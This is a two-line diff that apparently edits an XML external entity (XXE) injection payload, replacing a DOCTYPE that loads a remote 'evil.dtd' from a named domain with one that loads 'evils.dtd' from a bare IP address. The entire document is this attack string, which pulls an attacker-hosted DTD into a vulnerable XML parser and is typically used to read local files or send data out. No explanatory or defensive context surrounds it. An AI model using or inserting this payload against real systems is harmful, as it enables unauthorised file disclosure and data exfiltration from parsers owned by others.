@@ -1,2 +1,2 @@
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
-"https://balvant.in/poc/xxe/evil.dtd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % remote SYSTEM
+"http://62.84.186.132/evils.dtd"> %remote;]>
